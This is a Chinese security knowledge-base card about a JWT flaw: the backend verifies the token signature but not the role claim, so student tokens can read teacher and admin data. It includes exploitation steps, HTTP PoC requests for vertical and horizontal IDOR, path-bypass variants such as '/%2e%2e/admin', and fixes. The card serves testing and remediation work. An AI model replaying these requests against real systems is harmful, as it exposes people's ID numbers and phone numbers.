---
id: web-generic-auth-jwt-signature-only-role-bypass
title: JWT 仅校验签名未校验 role 导致垂直越权读取敏感数据
type: scenario
domain: web
path: web/generic/auth
technique: jwt-signature-only-missing-role-check
tags:
- jwt
- authz
- idor
- vertical-privilege-escalation
- spring-boot
- role-check
- sensitive-data
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-V4
  verified_at: '2026-11-04T21:40:10+08:00'
  notes: 已对照原文核对：学生JWT仅验签不验role访问/api/admin/teacher/evaluate返回200及156条含手机号/身份证记录，批量遍历teacher_id，另含水平IDOR变体；4张截图与正文一致（Student->Teacher 200、匿名401、admin接口泄露身份证）。原文无组件受影响版本，未设versions；未执行PoC
url: /docs/web/generic/auth/web-generic-auth-jwt-signature-only-role-bypass/
draft: false
kb_aliases:
- JWT 只验签不验角色
- role 字段未校验
- 学生 token 访问教师接口
- 垂直越权 JWT
- Spring Boot 越权
---

## 一句话结论

后端只校验 JWT 的签名有效性与过期时间，却不校验 payload 中的 `role` 声明，导致任意已登录的低权限用户（如学生）可以用自己的合法 token 直接访问教师/管理员接口，返回 200 并批量读取含身份证号、手机号等敏感数据。

## 原理

- JWT 是自包含凭证：签名只证明 token 由服务端签发且未被篡改，不证明持有者有权访问当前资源。`isValidToken()` 一类校验通常只检查签名、`exp`、`iss` 等，不包含业务角色判断。
- 接口的授权若只停留在“请求是否登录/是否持有有效 JWT”，那么角色边界就完全依赖前端隐藏入口或路由命名，而这两者都不是安全控制。
- 本案 `/api/admin/teacher/evaluate` 的鉴权拦截器只调用了签名校验，没有检查 JWT payload 中的 `role` 是否为 `teacher`/`admin`；学生 token 的 `role=student` 被原样接受。
- 由于接口本身按 `teacher_id` 查询评价记录，低权限用户不仅能进入，还能遍历 `teacher_id` 批量拉取全校教师的评价数据，其中每条记录包含评价学生的姓名、手机号和身份证号，造成大规模敏感信息泄露。
- 这类问题不是 JWT 算法缺陷，而是**认证与授权混淆**：认证回答“你是谁”，授权回答“你能做什么”；只做前者就会形成垂直越权。
- 同源问题还包括水平越权：同一个学生 token 修改 `user_code` 参数即可读取其他学生的奖学金记录，因为后端没有校验资源归属。

## 触发条件

- 应用使用 JWT（或类似自包含 token）做认证，并在 payload 中携带 `role`/`user_code` 等身份与角色信息。
- 服务端只校验 token 签名/有效期，接口上没有角色注解、权限拦截器或资源归属校验。
- 存在按角色划分的敏感接口（`/api/admin/**`、教师端、管理端、导出接口等）。
- 接口返回的数据包含其他用户的敏感字段（身份证、手机号、住址、财务信息等）。

## 利用步骤

1. 用普通低权限账号登录，获取 JWT；对 payload 做 Base64URL 解码，确认其中的 `role`、`user_code` 等声明。
2. 从 Swagger/OpenAPI、前端 JS、报错信息或目录扫描中枚举接口，重点关注 `/api/admin/**`、教师端、导出、统计类路径。
3. 用低权限 JWT 原样重放本应属于高权限角色的请求，记录状态码和响应体；与高权限账号的基线响应对比。
4. 若返回 200 且包含高权限数据，确认越权；再变更 `teacher_id`、`user_code`、`id` 等资源参数，验证能否批量遍历。
5. 换第二个低权限账号重复，排除“该账号恰好被授予特殊权限”的边界情况。
6. 对响应中的敏感字段做统计（身份证、手机号条数），评估影响范围并形成报告。

## PoC

```http
POST /api/auth/login HTTP/1.1
Host: jwxt.example.edu.cn
Content-Type: application/json

{"username":"20250701001","password":"****"}
```

```text
HTTP/1.1 200 OK
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2NvZGUiOiIyMDI1MDcwMTAwMDEiLCJyb2xlIjoic3R1ZGVudCJ9.xxx"}
```

JWT payload 解码：

```json
{"user_code":"20250701001","role":"student"}
```

用学生 token 访问教师专属接口：

```http
GET /api/admin/teacher/evaluate?teacher_id=T001 HTTP/1.1
Host: jwxt.example.edu.cn
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2NvZGUiOiIyMDI1MDcwMTAwMDEiLCJyb2xlIjoic3R1ZGVudCJ9.xxx
```

```text
HTTP/1.1 200 OK
Content-Type: application/json

{
  "code": 200,
  "data": {
    "teacherName": "张老师",
    "evaluations": [
      {
        "studentName": "李同学",
        "studentPhone": "138xxxx1234",
        "studentIdCard": "522xxxx0315",
        "comment": "讲课认真，深入浅出",
        "score": 4
      }
      // ... 共 156 条，每条含学生手机号和身份证号
    ],
    "statistics": {"avgScore": 4.2, "totalCount": 156}
  }
}
```

批量遍历：`teacher_id=T001 → T002 → T003 ...`，每次均返回 200 与完整评价列表。

水平越权变体：

```http
GET /api/finance/scholarship?user_code=2017002 HTTP/1.1
Authorization: Bearer <Student-A 的 JWT>
```

```text
HTTP/1.1 200 OK
{"data":{"studentCode":"2017002","studentName":"Student B","studentPhone":"139xxxx5678", ...}}
```

## 变体与关联

- 变体：水平 IDOR——token 属于 A，但资源参数 `user_code`/`id` 指向 B；后端不校验资源归属。
- 变体：角色声明不在 JWT 而在 Session、Header 或数据库；同样需要逐接口校验，不能只看登录态。
- 变体：路径绕过（`/admin`→`/./admin`、`/../admin`、`/%2e%2e/admin`）配合 Anonymous 访问，属于另一类鉴权绕过。
- 变体：只在前端隐藏管理按钮/路由，服务端接口未做角色校验；前端可见性不是授权。
- 关联：[[web-generic-auth-multi-session-matrix-leakscore]] 给出系统化发现此类越权的多会话矩阵方法；本卡描述具体利用与修复。

## 检测与防御

- 修复：在每个敏感接口显式校验角色与权限，例如 Spring Security `@PreAuthorize("hasAnyRole('ADMIN','TEACHER')")`，或统一拦截器对 `/api/admin/**` 强制角色校验。
- 修复：不要只调用 `isValidToken()`；认证通过后必须做授权决策，默认拒绝。
- 修复：资源级授权——查询/修改前校验当前用户与目标资源（`user_code`、`teacher_id`）的归属关系，不能信任请求参数。
- 加固：返回 403 应在业务逻辑执行前发生，避免“先查数据再判断”；统一错误响应，减少角色/资源存在性泄露。
- 加固：敏感字段脱敏与最小必要原则；即使教师有权查看，身份证号全号也应按业务需要脱敏。
- 检测：用低权限账号定期回归所有 `/api/admin/**`、教师端、导出接口，断言 403；监控同一低权限 token 对多角色接口的高频访问。
- 检测：关注 200 响应中异常增多的身份证/手机号模式，以及同一账号遍历大量资源 ID 的行为。
